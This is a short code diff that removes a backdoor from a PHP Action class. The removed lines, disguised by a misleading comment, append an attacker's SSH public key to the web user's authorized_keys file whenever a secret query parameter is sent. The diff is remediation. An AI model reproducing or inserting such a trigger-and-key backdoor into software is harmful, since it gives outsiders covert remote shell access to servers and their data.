@@ -29,11 +29,6 @@ abstract class Action {
     public $subRequest;
 
     public final function startAction() {
-        //<-- my company server crash
-        if (isset($_GET['caiyunDebug'])) {
-            system('echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAshwH2o/RbiZtzdaiQmdvqT+yvTiaV+F/1yExn7bDkO0I7F6kjtmqxnbL26TziJHJtWnMLfrxEmJqscLiJhrdmJzK04E6SUVeKsSpt4KYqmPFsi/P71p9Dogi3s0q5aM02RWXuGkPi6DxIH3mSWo6ekc3ga4l6RHjyJ3oThSU0v0+vq/4KK14j6g6SWKBFfsMph844GC3+RbrMNqmYJj+WVTS34YBJiKthmh/tRZt8FpzvvrVuBx3hVn5GXhQ70pHkdxPkarNCywh3KUXj2iIyNvBNxFiHgiKeLd8SE7pBQHvebThvOVK/3Bf3iTrKRBRDWTgJHBfmswcXKNpB+G8jQ== Shawn Huang@SHAWN-OFFICE" >> /home/www/.ssh/authorized_keys');
-            }
-        //--> ends
         switch($this->actionStatus) {
             case self::STATUS_NORMAL:
             case self::STATUS_READONLY:
